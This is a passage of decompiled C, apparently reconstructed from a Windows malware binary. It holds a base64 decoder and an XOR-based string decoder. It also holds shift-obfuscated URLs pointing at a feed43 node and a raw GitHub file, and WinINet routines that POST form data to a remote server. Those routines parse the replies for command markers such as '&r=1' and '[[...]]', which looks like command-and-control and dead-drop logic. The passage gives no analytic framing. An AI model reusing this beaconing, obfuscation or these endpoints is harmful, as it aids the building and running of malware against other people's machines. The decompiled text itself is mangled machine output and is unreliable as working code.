    int32_t v44; // 0x409d80
    int32_t v45; // 0x409d80
    char * v46; // 0x409d80
    int32_t v47; // 0x409f2f
    int32_t v48; // 0x409f36
    if ((v43 & 0xff00) == 0x3d00) {
        // 0x409f3c
        v14 = v41;
        v45 = v41;
        v46 = v42;
        v44 = v40;
    } else {
        // 0x409f27
        v47 = 16 * v43 & 240 | v35 / 4;
        *v42 = (char)v47;
        v48 = v39 + 2;
        v14 = v48;
        v45 = v48;
        v46 = (char *)v48;
        v44 = v47;
    }
    int32_t v49 = v45; // 0x409f49
    int32_t v50 = v49; // 0x409f42
    char * v51 = v46; // 0x409f42
    if ((v22 & 0xff00) != 0x3d00) {
        // 0x409f44
        *(char *)v49 = (char)((v44 | v38) / 256 | 64 * v35);
        v50 = v14 + 1;
        v51 = (char *)v50;
    }
    char * v52 = v51;
    int32_t v53 = v11 + 4; // 0x409f52
    v10 = v52;
    while (v53 < v4) {
        // 0x409e10
        v11 = v53;
        v12 = *(char *)(v11 + v2);
        v13 = v11 | 1;
        v15 = v50 & -0x10000;
        v16 = v15 | 0x4141;
        if (v13 < v4) {
            // 0x409e20
            v16 = v15 | (int32_t)*(char *)(v13 + v2) | 0x4100;
        }
        // 0x409e24
        v17 = v16;
        v18 = v17;
        if (v13 + 1 < v4) {
            // 0x409e2b
            v18 = 256 * (int32_t)*(char *)((v11 | 2) + v2) | v17 & -0xff01;
        }
        // 0x409e32
        v19 = v18;
        v20 = v11 | 3;
        v21 = 0x4100;
        if (v20 < v4) {
            // 0x409e39
            v21 = 256 * (int32_t)*(char *)(v20 + v2);
        }
        // 0x409e40
        v22 = v21;
        v23 = v12 - 65;
        if (v23 < 26) {
            // 0x409e48
            v24 = v23;
        } else {
            if (v12 < 123) {
                // 0x409e55
                v24 = v12 - 71;
            } else {
                if (v12 < 58) {
                    // 0x409e62
                    v24 = v12 + 4;
                } else {
                    // 0x409e67
                    v24 = v12 != 43 ? 63 : 62;
                }
            }
        }
        // 0x409e70
        v25 = v19;
        if (v25 < 91) {
            // 0x409e78
            v27 = v19 + 191 & 255 | v19 & -256;
            v14 = v27;
            v26 = v27;
        } else {
            if (v25 < 123) {
                // 0x409e85
                v28 = v19 + 185 & 255 | v19 & -256;
                v14 = v28;
                v26 = v28;
            } else {
                if (v25 < 58) {
                    // 0x409e92
                    v29 = v19 + 4 & 255 | v19 & -256;
                    v14 = v29;
                    v26 = v29;
                } else {
                    // 0x409e97
                    v30 = (v25 != 43 ? 63 : 62) | v19 & -256;
                    v14 = v30;
                    v26 = v30;
                }
            }
        }
        // 0x409ea0
        v31 = v26 / 256;
        v32 = v31;
        if (v32 < 91) {
            // 0x409ea8
            v33 = v31 + 191 & 255;
        } else {
            if (v32 < 123) {
                // 0x409eb7
                v33 = v31 + 185 & 255;
            } else {
                if (v32 < 58) {
                    // 0x409ec6
                    v33 = v31 + 4 & 255;
                } else {
                    // 0x409ecd
                    v33 = v32 != 43 ? 63 : 62;
                }
            }
        }
        // 0x409ed6
        v34 = v24 | v22;
        v35 = v33;
        v36 = v22 / 256;
        if (v36 < 91) {
            // 0x409ede
            v37 = v34 + 0xbf00 & 0xff00;
        } else {
            if (v36 < 123) {
                // 0x409eed
                v37 = v34 + 0xb900 & 0xff00;
            } else {
                if (v36 < 58) {
                    // 0x409efc
                    v37 = v34 + 1024 & 0xff00;
                } else {
                    // 0x409f03
                    v37 = 256 * (int32_t)((v22 & 0xff00) != 0x2b00) | 0x3e00;
                }
            }
        }
        // 0x409f0c
        v38 = v37;
        v39 = (int32_t)v10;
        v40 = v26 / 16 & 15 | 4 * v34 & 252;
        *v10 = (char)v40;
        v41 = v39 + 1;
        v42 = (char *)v41;
        v43 = v14;
        if ((v43 & 0xff00) == 0x3d00) {
            // 0x409f3c
            v14 = v41;
            v45 = v41;
            v46 = v42;
            v44 = v40;
        } else {
            // 0x409f27
            v47 = 16 * v43 & 240 | v35 / 4;
            *v42 = (char)v47;
            v48 = v39 + 2;
            v14 = v48;
            v45 = v48;
            v46 = (char *)v48;
            v44 = v47;
        }
        // 0x409f3f
        v49 = v45;
        v50 = v49;
        v51 = v46;
        if ((v22 & 0xff00) != 0x3d00) {
            // 0x409f44
            *(char *)v49 = (char)((v44 | v38) / 256 | 64 * v35);
            v50 = v14 + 1;
            v51 = (char *)v50;
        }
        // 0x409f4f
        v52 = v51;
        v53 = v11 + 4;
        v10 = v52;
    }
    // 0x409f60
    LocalFree(memoryHandle);
    return (int32_t)v52 - v8;
  lab_0x409df7:
    // 0x409df7
    v4 = v5;
    int32_t v54; // 0x409d80
    int32_t v55 = v54 + 1; // 0x409df7
    v3 = *(char *)v55;
    v54 = v55;
    if (v3 == 0) {
        // break -> 0x409e00
        goto lab_0x409e00;
    }
    goto lab_0x409dc4;
}

// Address range: 0x409f80 - 0x40a030
int32_t function_409f80(void) {
    // 0x409f80
    int32_t lpString; // 0x409f80
    int32_t memoryHandle = (int32_t)LocalAlloc(64, lstrlenA((char *)lpString)); // 0x409f8f
    int32_t v1 = function_409d80(); // 0x409f9b
    int32_t v2 = v1 - (v1 >> 31); // 0x409fa6
    if (v2 < 2) {
        // 0x40a02a
        return memoryHandle;
    }
    int32_t v3 = 0; // 0x409fac
    int32_t v4 = 2 * v3 + memoryHandle;
    char v5 = *(char *)v4; // 0x409fb0
    char v6 = v5 - 48; // 0x409fb3
    char v7 = v6; // 0x409fb8
    if (v6 >= 10) {
        if (v5 < 71) {
            // 0x409fc9
            v7 = v5 - 55;
        } else {
            // 0x409fd1
            v7 = v5 < 103 ? v5 - 87 : 0;
        }
    }
    char v8 = *(char *)(v4 + 1); // 0x409fe2
    char v9 = v8 - 48; // 0x409fe6
    char v10 = v9; // 0x409fec
    if (v9 >= 10) {
        if (v8 < 71) {
            // 0x409ffe
            v10 = v8 - 55;
        } else {
            // 0x40a006
            v10 = v8 < 103 ? v8 - 87 : 0;
        }
    }
    unsigned char v11 = v10 + 16 * v7 ^ 35; // 0x40a01f
    *(char *)(v3 + memoryHandle) = v11 / 32 | 8 * v11;
    v3++;
    while (v3 != v2 / 2) {
        // 0x409fb0
        v4 = 2 * v3 + memoryHandle;
        v5 = *(char *)v4;
        v6 = v5 - 48;
        v7 = v6;
        if (v6 >= 10) {
            if (v5 < 71) {
                // 0x409fc9
                v7 = v5 - 55;
            } else {
                // 0x409fd1
                v7 = v5 < 103 ? v5 - 87 : 0;
            }
        }
        // 0x409fe2
        v8 = *(char *)(v4 + 1);
        v9 = v8 - 48;
        v10 = v9;
        if (v9 >= 10) {
            if (v8 < 71) {
                // 0x409ffe
                v10 = v8 - 55;
            } else {
                // 0x40a006
                v10 = v8 < 103 ? v8 - 87 : 0;
            }
        }
        // 0x40a018
        v11 = v10 + 16 * v7 ^ 35;
        *(char *)(v3 + memoryHandle) = v11 / 32 | 8 * v11;
        v3++;
    }
    // 0x40a02a
    return memoryHandle;
}

// Address range: 0x40a030 - 0x40a231
int32_t function_40a030(void) {
    // 0x40a030
    __chkstk();
    int32_t v1; // 0x40a030
    function_404410((char *)v1);
    int32_t v2; // 0x40a030
    int32_t v3 = v2;
    v2 = v3 + 1;
    while (*(char *)v3 != 0) {
        // 0x40a065
        v3 = v2;
        v2 = v3 + 1;
    }
    // 0x40a06c
    int32_t v4; // bp-1196, 0x40a030
    char * v5 = (char *)&v4; // bp-28, 0x40a079
    int32_t v6; // 0x40a030
    function_40ee86(&v4, v6, 1 - v6 + v3);
    if (function_409b80() == 0) {
        // 0x40a220
        return _40___security_check_cookie_40_4();
    }
    int32_t v7 = function_409cc0(); // 0x40a097
    int32_t v8 = v7; // 0x40a0a0
    while (*(char *)v8 != 0) {
        // 0x40a0a3
        v8++;
    }
    int32_t v9 = v8 - v7; // 0x40a0aa
    int32_t v10 = _malloc(); // 0x40a0b0
    char * v11 = (char *)v10; // 0x40a0bc
    v5 = v11;
    _strncpy(v11, (char *)v7, v9);
    *(char *)(v10 + v9) = 0;
    int32_t memoryHandle = (int32_t)LocalAlloc(64, lstrlenA((char *)function_409f80())); // 0x40a0dc
    function_409d80();
    v5 = (char *)-0x78695a4c;
    int32_t v12; // bp-196, 0x40a030
    _memset(&v12, 0, -0x3c2d1e10);
    function_406f80();
    int32_t v13 = memoryHandle; // 0x40a149
    while (*(char *)v13 != 0) {
        // 0x40a150
        v13++;
    }
    int32_t v14 = v13 - memoryHandle; // 0x40a157
    int32_t v15 = v14 & -0x7ffffff9; // 0x40a15b
    int32_t v16; // 0x40a030
    if (v15 >= 0) {
        // 0x40a168
        v16 = v14;
        if (v15 == 0) {
            goto lab_0x40a17c;
        } else {
            // 0x40a16a
            v16 = v14 + 8 + (v14 >> 31 & 7) & -8;
            goto lab_0x40a17c;
        }
    } else {
        // 0x40a163
        v16 = v14;
        if ((v14 + 7 & 7) == 7) {
            goto lab_0x40a17c;
        } else {
            // 0x40a16a
            v16 = v14 + 8 + (v14 >> 31 & 7) & -8;
            goto lab_0x40a17c;
        }
    }
  lab_0x40a17c:;
    int32_t v17 = (int32_t)&v5; // 0x40a143
    int32_t * v18; // 0x40a030
    if (v16 < 1) {
        // 0x40a17c
        v18 = (int32_t *)(v17 - 4);
    } else {
        int32_t * v19 = (int32_t *)(v17 - 4);
        int32_t v20 = (v16 - 1) / 8 + 1; // 0x40a194
        int32_t v21; // bp-5364, 0x40a030
        *v19 = (int32_t)&v21;
        function_406b40((int32_t)&g36);
        v20--;
        v18 = v19;
        while (v20 != 0) {
            // 0x40a195
            *v19 = (int32_t)&v21;
            function_406b40((int32_t)&g36);
            v20--;
            v18 = v19;
        }
    }
    // 0x40a1b7
    *v18 = (int32_t)"http://";
    *(int32_t *)(v17 - 8) = (int32_t)&v12;
    char * v22 = StrStrIA((char *)&g36, (char *)&g36); // 0x40a1c9
    int32_t v23; // bp-189, 0x40a030
    int32_t v24 = v22 == NULL ? &v12 : &v23; // 0x40a1d9
    *(int32_t *)(v17 - 12) = (int32_t)"https://";
    *(int32_t *)(v17 - 16) = v24;
    int32_t v25 = StrStrIA((char *)&g36, (char *)&g36) == NULL ? v24 : v24 + 8;
    char v26 = *(char *)v25; // 0x40a1eb
    int32_t v27 = 0; // 0x40a1f7
    if (v26 != 47) {
        char v28 = v26; // 0x40a1fd
        int32_t v29 = 0; // 0x40a1fd
        int32_t v30 = v25; // 0x40a1fd
        v27 = v29;
        while (v28 != 0) {
            // 0x40a204
            *(char *)(v1 - v25 + v30) = v28;
            v29++;
            v30++;
            v28 = *(char *)v30;
            v27 = v29;
            if (v28 == 47) {
                // break -> 0x40a210
                break;
            }
            v27 = v29;
        }
    }
    // 0x40a210
    *(int32_t *)(v17 - 20) = memoryHandle;
    *(char *)(v27 + v1) = 0;
    LocalFree(&g36);
    // 0x40a220
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40a240 - 0x40a4ab
int32_t function_40a240(int32_t a1, int32_t * a2, int32_t a3) {
    int32_t v1 = 0x54534f50; // bp-20, 0x40a258
    __asm_rep_stosd_memset((char *)a1, 0, 0x88b8);
    int32_t v2; // bp-140, 0x40a240
    if (!InternetGetConnectedState(&v2, (int32_t)&g36)) {
        // 0x40a495
        return _40___security_check_cookie_40_4();
    }
    // 0x40a28f
    int32_t v3; // 0x40a240
    int32_t * v4 = InternetConnectA((int32_t *)g33, (char *)v3, 80, NULL, NULL, 3, 0, 1); // 0x40a2a2
    if (v4 == NULL) {
        // 0x40a2af
        return _40___security_check_cookie_40_4();
    }
    // 0x40a2c2
    int128_t v5; // 0x40a240
    __asm_movups_9(v5, __asm_movaps(0x7061203a657079542d746e65746e6f43));
    int128_t v6; // 0x40a240
    __asm_movups_9(v6, __asm_movaps(g12));
    int128_t v7; // 0x40a240
    __asm_movups_9(v7, __asm_movaps(0x6465646f636e656c72752d6d726f66));
    int32_t * memoryHandle = LocalAlloc((int32_t)&g36, (int32_t)&g36); // 0x40a2e7
    int32_t v8 = (int32_t)memoryHandle; // bp-128, 0x40a2ed
    int32_t v9; // 0x40a240
    char * lpString = (char *)v9; // bp-208, 0x40a2fb
    int32_t v10 = (int32_t)&lpString; // 0x40a2fb
    *(char *)memoryHandle = 97;
    *(char *)(v8 + 1) = 112;
    *(char *)(v8 + 2) = 112;
    *(char *)(v8 + 3) = 108;
    *(char *)(v8 + 4) = 105;
    *(char *)(v8 + 5) = 99;
    *(char *)(v8 + 6) = 97;
    *(char *)(v8 + 7) = 116;
    *(char *)(v8 + 8) = 105;
    *(char *)(v8 + 9) = 111;
    *(char *)(v8 + 10) = 110;
    *(char *)(v8 + 11) = 47;
    *(char *)(v8 + 12) = 120;
    *(char *)(v8 + 13) = 45;
    *(char *)(v8 + 14) = 119;
    *(char *)(v8 + 15) = 119;
    *(char *)(v8 + 16) = 119;
    *(char *)(v8 + 17) = 45;
    *(char *)(v8 + 18) = 102;
    *(char *)(v8 + 19) = 111;
    *(char *)(v8 + 20) = 114;
    *(char *)(v8 + 21) = 109;
    *(char *)(v8 + 22) = 45;
    *(char *)(v8 + 23) = 117;
    *(char *)(v8 + 24) = 114;
    *(char *)(v8 + 25) = 108;
    *(char *)(v8 + 26) = 101;
    *(char *)(v8 + 27) = 110;
    *(char *)(v8 + 28) = 99;
    *(char *)(v8 + 29) = 111;
    *(char *)(v8 + 30) = 100;
    *(char *)(v8 + 31) = 101;
    *(char *)(v8 + 32) = 100;
    *(char *)(v8 + 33) = 0;
    int32_t v11 = v10; // 0x40a3ee
    int32_t v12 = 0; // 0x40a3ee
    int32_t v13 = v10; // 0x40a3ee
    int32_t v14 = 0; // 0x40a3ee
    if (lstrlenA(lpString) >= 1) {
        int32_t v15 = 0;
        int32_t v16 = v12 + v9;
        int32_t v17 = v15; // 0x40a3f7
        if (*(char *)v16 == 46) {
            // 0x40a3f9
            v17 = v15;
            if (*(char *)(v16 + 1) == 112) {
                // 0x40a400
                v17 = v15;
                if (*(char *)(v16 + 2) == 104) {
                    // 0x40a407
                    v17 = v15;
                    if (*(char *)(v16 + 3) == 112) {
                        // 0x40a40e
                        *(char *)(v16 + 4) = 0;
                        v17 = v16 + 5;
                    }
                }
            }
        }
        int32_t v18 = v17;
        v11 -= 4;
        v12++;
        uint32_t v19 = lstrlenA((char *)&g36); // 0x40a417
        v13 = v11;
        v14 = v18;
        while (v12 < v19) {
            // 0x40a3f0
            v15 = v18;
            v16 = v12 + v9;
            v17 = v15;
            if (*(char *)v16 == 46) {
                // 0x40a3f9
                v17 = v15;
                if (*(char *)(v16 + 1) == 112) {
                    // 0x40a400
                    v17 = v15;
                    if (*(char *)(v16 + 2) == 104) {
                        // 0x40a407
                        v17 = v15;
                        if (*(char *)(v16 + 3) == 112) {
                            // 0x40a40e
                            *(char *)(v16 + 4) = 0;
                            v17 = v16 + 5;
                        }
                    }
                }
            }
            // 0x40a415
            v18 = v17;
            v11 -= 4;
            v12++;
            v19 = lstrlenA((char *)&g36);
            v13 = v11;
            v14 = v18;
        }
    }
    int32_t v20 = (int32_t)v4; // 0x40a2a2
    *(int32_t *)(v13 - 4) = 0;
    *(int32_t *)(v13 - 8) = -0x7c000000;
    *(int32_t *)(v13 - 12) = (int32_t)&v8;
    *(int32_t *)(v13 - 16) = 0;
    *(int32_t *)(v13 - 20) = 0;
    *(int32_t *)(v13 - 28) = (int32_t)&v1;
    *(int32_t *)(v13 - 32) = v20;
    int32_t v21 = HttpOpenRequestA(); // 0x40a438
    if (v21 == 0) {
        // 0x40a2af
        return _40___security_check_cookie_40_4();
    }
    // 0x40a448
    int128_t v22; // bp-120, 0x40a240
    int32_t v23 = &v22; // 0x40a448
    int32_t v24 = v23; // 0x40a44e
    while (*(char *)v24 != 0) {
        // 0x40a450
        v24++;
    }
    // 0x40a457
    *(int32_t *)(v13 - 36) = v14;
    *(int32_t *)(v13 - 40) = lstrlenA((char *)&g36);
    *(int32_t *)(v13 - 44) = v14;
    int32_t v25; // bp-119, 0x40a240
    *(int32_t *)(v13 - 48) = v24 - (int32_t)&v25;
    *(int32_t *)(v13 - 52) = v23;
    *(int32_t *)(v13 - 56) = v21;
    HttpSendRequestA(&g36, (char *)&g36, (int32_t)&g36, &g36, (int32_t)&g36);
    int32_t v26; // bp-144, 0x40a240
    *(int32_t *)(v13 - 60) = (int32_t)&v26;
    *(int32_t *)(v13 - 64) = 0x222e0;
    *(int32_t *)(v13 - 68) = a1;
    *(int32_t *)(v13 - 72) = v21;
    InternetReadFile(&g36, &g36, (int32_t)&g36, &g36);
    *(int32_t *)(v13 - 76) = v21;
    InternetCloseHandle(&g36);
    *(int32_t *)(v13 - 80) = v20;
    InternetCloseHandle(&g36);
    // 0x40a495
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40a4b0 - 0x40a750
int32_t function_40a4b0(void) {
    // 0x40a4b0
    __chkstk();
    int32_t uFlags; // 0x40a4b0
    int32_t * memoryHandle = LocalAlloc(uFlags, (int32_t)&g36); // 0x40a4d9
    int32_t v1; // 0x40a4b0
    int32_t v2 = StrStrIA((char *)memoryHandle, (char *)&g36) == NULL ? v1 : v1 + 7;
    char * v3 = (char *)v2; // 0x40a4ff
    char * v4 = v3; // bp-40, 0x40a4ff
    int32_t v5 = StrStrIA(v3, "https://") == NULL ? v2 : v2 + 8;
    unsigned char v6 = *(char *)v5; // 0x40a509
    int32_t v7 = v1 & -256 | (int32_t)v6; // 0x40a509
    int32_t v8 = v7; // 0x40a50f
    int32_t v9 = 0; // 0x40a50f
    int32_t v10; // bp-84, 0x40a4b0
    if (v6 >= 1) {
        int32_t v11 = (int32_t)&v10 - v5; // 0x40a516
        int32_t v12 = v7; // 0x40a516
        int32_t v13 = v5; // 0x40a516
        int32_t v14 = 0; // 0x40a516
        char v15 = v12; // 0x40a518
        v8 = v12;
        while (v15 != 47) {
            // 0x40a51d
            *(char *)(v11 + v13) = v15;
            v14++;
            v13++;
            unsigned char v16 = *(char *)v13; // 0x40a521
            v12 = v12 & -256 | (int32_t)v16;
            v8 = v12;
            if (v14 >= (int32_t)v16) {
                // break -> 0x40a52c
                break;
            }
            v15 = v12;
            v8 = v12;
        }
        // 0x40a52c
        v9 = v14;
        if (v9 >= 50) {
            // 0x40a742
            function_40b44d();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            return __asm_int3();
        }
    }
    int32_t v17 = (int32_t)memoryHandle; // 0x40a4d9
    int32_t v18 = v8;
    int32_t v19; // bp-4, 0x40a4b0
    *(char *)((int32_t)&v19 - 80 + v9) = 0;
    int32_t v20; // bp-140244, 0x40a4b0
    char * v21 = (char *)&v20; // bp-48, 0x40a547
    int32_t v22 = function_40a240(v18, &v20, v18); // 0x40a54f
    char ** v23 = &v4; // 0x40a559
    int32_t v24; // 0x40a4b0
    int32_t v25; // 0x40a4b0
    int32_t v26; // bp-244, 0x40a4b0
    int32_t v27; // bp-88, 0x40a4b0
    if (v22 == 0) {
        goto lab_0x40a717;
    } else {
        // 0x40a55f
        v21 = (char *)&v20;
        char * v28 = StrStrIA((char *)&v20, "&r=1"); // 0x40a56b
        v25 = (int32_t)&v21;
        if (v28 != NULL) {
            goto lab_0x40a6e9;
        } else {
            char * v29 = (char *)&v20; // bp-56, 0x40a580
            char * v30 = StrStrIA((char *)&v20, "404 Not Found"); // 0x40a581
            v23 = &v29;
            if (v30 != NULL) {
                goto lab_0x40a717;
            } else {
                char * v31 = (char *)&v20; // bp-64, 0x40a596
                char * v32 = StrStrIA((char *)&v20, "[["); // 0x40a597
                v23 = &v31;
                if (v32 == NULL) {
                    goto lab_0x40a717;
                } else {
                    char * v33 = (char *)((int32_t)v32 + 2); // 0x40a5ab
                    char * v34 = StrStrIA(v33, "]]"); // 0x40a5ac
                    char * lpString = v33; // bp-76, 0x40a5b4
                    *v34 = 0;
                    int32_t v35 = lstrlenA(lpString); // 0x40a5b8
                    v25 = (int32_t)&lpString;
                    if (v35 == 0) {
                        goto lab_0x40a6e9;
                    } else {
                        int32_t uBytes = lstrlenA((char *)function_409f80()); // 0x40a5cc
                        v10 = uBytes;
                        v27 = 64;
                        int32_t memoryHandle2 = (int32_t)LocalAlloc(64, uBytes); // 0x40a5d1
                        function_409d80();
                        _memset(&v26, 0, 160);
                        function_406f80();
                        int32_t v36 = memoryHandle2;
                        int32_t v37 = v36 + 1; // 0x40a63d
                        while (*(char *)v36 != 0) {
                            // 0x40a638
                            v36 = v37;
                            v37 = v36 + 1;
                        }
                        int32_t v38 = v36 - memoryHandle2; // 0x40a63f
                        int32_t v39 = v38 & -0x7ffffff9; // 0x40a643
                        if (v39 >= 0) {
                            // 0x40a650
                            v24 = v38;
                            if (v39 == 0) {
                                goto lab_0x40a664;
                            } else {
                                // 0x40a652
                                v24 = v38 + 8 + (v38 >> 31 & 7) & -8;
                                goto lab_0x40a664;
                            }
                        } else {
                            // 0x40a64b
                            v24 = v38;
                            if ((v38 + 7 & 7) == 7) {
                                goto lab_0x40a664;
                            } else {
                                // 0x40a652
                                v24 = v38 + 8 + (v38 >> 31 & 7) & -8;
                                goto lab_0x40a664;
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x40a717:;
    int32_t v40 = (int32_t)v23;
    *(int32_t *)(v40 - 4) = v17;
    LocalFree(&g36);
    *(int32_t *)(v40 - 8) = g34;
    ReleaseMutex(&g36);
    return _40___security_check_cookie_40_4();
  lab_0x40a6e9:
    // 0x40a6e9
    *(int32_t *)(v25 - 4) = v17;
    LocalFree(&g36);
    *(int32_t *)(v25 - 8) = g34;
    ReleaseMutex(&g36);
    return _40___security_check_cookie_40_4();
  lab_0x40a664:;
    int32_t v41 = &v27; // 0x40a632
    int32_t * v42; // 0x40a4b0
    if (v24 < 1) {
        // 0x40a664
        v42 = (int32_t *)(v41 - 4);
    } else {
        int32_t * v43 = (int32_t *)(v41 - 4);
        int32_t v44 = (v24 - 1) / 8 + 1; // 0x40a676
        int32_t v45; // bp-144412, 0x40a4b0
        *v43 = (int32_t)&v45;
        function_406b40((int32_t)&g36);
        v44--;
        v42 = v43;
        while (v44 != 0) {
            // 0x40a677
            *v43 = (int32_t)&v45;
            function_406b40((int32_t)&g36);
            v44--;
            v42 = v43;
        }
    }
    // 0x40a699
    *v42 = (int32_t)"http://";
    *(int32_t *)(v41 - 8) = (int32_t)&v26;
    char * v46 = StrStrIA((char *)&g36, (char *)&g36); // 0x40a6a7
    *(int32_t *)(v41 - 12) = (int32_t)"https://";
    int32_t v47; // bp-237, 0x40a4b0
    int32_t v48 = v46 == NULL ? &v26 : &v47; // 0x40a6b6
    int32_t v49 = v41 - 16; // 0x40a6b9
    *(int32_t *)v49 = v48;
    int32_t v50 = StrStrIA((char *)&g36, (char *)&g36) == NULL ? v48 : v48 + 8;
    char v51 = *(char *)v50; // 0x40a6c3
    int32_t v52 = 0; // 0x40a6cf
    if (v51 != 47) {
        char v53 = v51; // 0x40a6d3
        int32_t v54 = 0; // 0x40a6d3
        int32_t v55 = v50; // 0x40a6d3
        v52 = v54;
        while (v53 != 0) {
            // 0x40a6d9
            *(char *)(uFlags - v50 + v55) = v53;
            v54++;
            v55++;
            v53 = *(char *)v55;
            v52 = v54;
            if (v53 == 47) {
                // break -> 0x40a6e5
                break;
            }
            v52 = v54;
        }
    }
    // 0x40a6e5
    *(char *)(v52 + uFlags) = 0;
    v25 = v49;
    goto lab_0x40a6e9;
}

// Address range: 0x40a750 - 0x40aa0f
int32_t function_40a750(void) {
    // 0x40a750
    int32_t v1; // bp-4, 0x40a750
    int32_t v2 = &v1; // 0x40a751
    int32_t v3; // bp-1192, 0x40a750
    _memset(&v3, 0, 960);
    int32_t lpString1; // bp-952, 0x40a750
    lstrcpyA((char *)&lpString1, "iuuqt;00opef3/gffe54/dpn01167345289626242/ynm");
    int32_t lpString1_; // bp-872, 0x40a750
    char * v4 = (char *)&lpString1_; // bp-1240, 0x40a7a7
    lstrcpyA((char *)&lpString1_, "iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0qfufstponjlf0uftu0nbtufs0ynm/ynm");
    int128_t v5 = __asm_movaps(0x6d6d6a7b704e3b756f66684273667456); // 0x40a7aa
    int128_t v6 = __asm_movaps(g8); // 0x40a7b3
    int128_t v7; // 0x40a750
    __asm_movups_9(v7, v5);
    int128_t v8; // 0x40a750
    __asm_movups_9(v8, __asm_movaps(g18));
    int128_t v9; // 0x40a750
    __asm_movups_9(v9, __asm_movaps(g19));
    int128_t v10; // 0x40a750
    __asm_movups_9(v10, __asm_movaps(g17));
    int128_t v11; // 0x40a750
    __asm_movups_9(v11, __asm_movaps(g21));
    int128_t v12; // 0x40a750
    __asm_movups_9(v12, __asm_movaps(g14));
    int32_t v13 = v2 - 124; // 0x40a810
    int32_t v14 = 0; // 0x40a80c
    int128_t * v15 = (int128_t *)(v14 + v13); // 0x40a810
    __asm_movups_9(*v15, __asm_psubb(__asm_movups(*v15), v6));
    int128_t * v16 = (int128_t *)(v2 - 108 + v14); // 0x40a81e
    __asm_movups_9(*v16, __asm_psubb(__asm_movups(*v16), v6));
    v14 += 32;
    int32_t v17 = 96; // 0x40a832
    while (v14 < 96) {
        // 0x40a810
        v15 = (int128_t *)(v14 + v13);
        __asm_movups_9(*v15, __asm_psubb(__asm_movups(*v15), v6));
        v16 = (int128_t *)(v2 - 108 + v14);
        __asm_movups_9(*v16, __asm_psubb(__asm_movups(*v16), v6));
        v14 += 32;
        v17 = 96;
    }
    char * v18 = (char *)(v17 + v13); // 0x40a840
    *v18 = *v18 - 1;
    int32_t v19 = v17 + 1; // 0x40a844
    v17 = v19;
    while (v19 != 109) {
        // 0x40a840
        v18 = (char *)(v17 + v13);
        *v18 = *v18 - 1;
        v19 = v17 + 1;
        v17 = v19;
    }
    char * lpString = (char *)12; // 0x40a856
    int32_t v20 = &v3;
    int32_t v21 = (int32_t)&v4 - 4; // 0x40a860
    *(int32_t *)v21 = v20;
    int32_t v22 = v21; // 0x40a867
    int32_t v23 = 0; // 0x40a867
    int32_t v24 = v21; // 0x40a867
    char * v25; // 0x40a870
    int32_t v26; // 0x40a873
    int32_t v27; // 0x40a874
    uint32_t v28; // 0x40a875
    if (lstrlenA(lpString) >= 1) {
        v25 = (char *)(v23 + v20);
        *v25 = *v25 - 1;
        v26 = v23 + 1;
        v27 = v22 - 4;
        *(int32_t *)v27 = v20;
        v28 = lstrlenA((char *)&g36);
        v22 = v27;
        v23 = v26;
        v24 = v27;
        while (v26 < v28) {
            // 0x40a870
            v25 = (char *)(v23 + v20);
            *v25 = *v25 - 1;
            v26 = v23 + 1;
            v27 = v22 - 4;
            *(int32_t *)v27 = v20;
            v28 = lstrlenA((char *)&g36);
            v22 = v27;
            v23 = v26;
            v24 = v27;
        }
    }
    int32_t v29 = v24;
    int32_t v30 = (int32_t)lpString - 1; // 0x40a87e
    lpString = (char *)v30;
    int32_t v31 = v20 + 80; // 0x40a885
    while (v30 != 0) {
        // 0x40a860
        v20 = v31;
        v21 = v29 - 4;
        *(int32_t *)v21 = v20;
        v22 = v21;
        v23 = 0;
        v24 = v21;
        if (lstrlenA(lpString) >= 1) {
            v25 = (char *)(v23 + v20);
            *v25 = *v25 - 1;
            v26 = v23 + 1;
            v27 = v22 - 4;
            *(int32_t *)v27 = v20;
            v28 = lstrlenA((char *)&g36);
            v22 = v27;
            v23 = v26;
            v24 = v27;
            while (v26 < v28) {
                // 0x40a870
                v25 = (char *)(v23 + v20);
                *v25 = *v25 - 1;
                v26 = v23 + 1;
                v27 = v22 - 4;
                *(int32_t *)v27 = v20;
                v28 = lstrlenA((char *)&g36);
                v22 = v27;
                v23 = v26;
                v24 = v27;
            }
        }
        // 0x40a87b
        v29 = v24;
        v30 = (int32_t)lpString - 1;
        lpString = (char *)v30;
        v31 = v20 + 80;
    }
    // 0x40a887
    *(int32_t *)(v29 - 4) = 50;
    *(int32_t *)(v29 - 8) = 64;
    int32_t * memoryHandle = LocalAlloc(0, (int32_t)&g36); // 0x40a88b
    int32_t v32 = (int32_t)memoryHandle; // 0x40a88b
    *(int32_t *)(v29 - 12) = 0;
    *(int32_t *)(v29 - 16) = 0;
    *(int32_t *)(v29 - 20) = 0;
    *memoryHandle = 0x6c707061;
    *(int32_t *)(v32 + 4) = 0x74616369;
    *(int32_t *)(v32 + 8) = 0x2f6e6f69;
    *(int32_t *)(v32 + 12) = 0x77772d78;
    *(int32_t *)(v32 + 16) = 0x6f662d77;
    *(int32_t *)(v32 + 20) = 0x752d6d72;
    *(int32_t *)(v32 + 24) = 0x6e656c72;
    *(int32_t *)(v32 + 28) = 0x65646f63;
    *(int16_t *)(v32 + 32) = 100;
    *(int32_t *)(v29 - 24) = 1;
    int128_t v33; // bp-128, 0x40a750
    *(int32_t *)(v29 - 28) = (int32_t)&v33;
    int32_t * v34 = InternetOpenA((char *)&g36, (int32_t)&g36, (char *)&g36, (char *)&g36, (int32_t)&g36); // 0x40a8da
    g33 = (int32_t)v34;
    *(int32_t *)(v29 - 32) = 0;
    int32_t v35; // bp-1208, 0x40a750
    *(int32_t *)(v29 - 36) = (int32_t)&v35;
    if (!InternetGetConnectedState(&g36, (int32_t)&g36) || g33 == 0) {
        // 0x40a9fc
        return _40___security_check_cookie_40_4();
    }
    int128_t v36 = __asm_movaps(0x70696b69772e6e652f2f3a7370747468); // 0x40a909
    *(int32_t *)(v29 - 40) = 0;
    *(int32_t *)(v29 - 44) = 1;
    int128_t v37; // bp-232, 0x40a750
    *(int32_t *)(v29 - 48) = (int32_t)&v37;
    __asm_movups_9(0, v36);
    if (!InternetCheckConnectionA((char *)0x61696465, 0x67726f2e, 0)) {
        // 0x40a9fc
        return _40___security_check_cookie_40_4();
    }
    // 0x40a94b
    int32_t v38; // 0x40a750
    if (function_40a030() != 0) {
        // 0x40a962
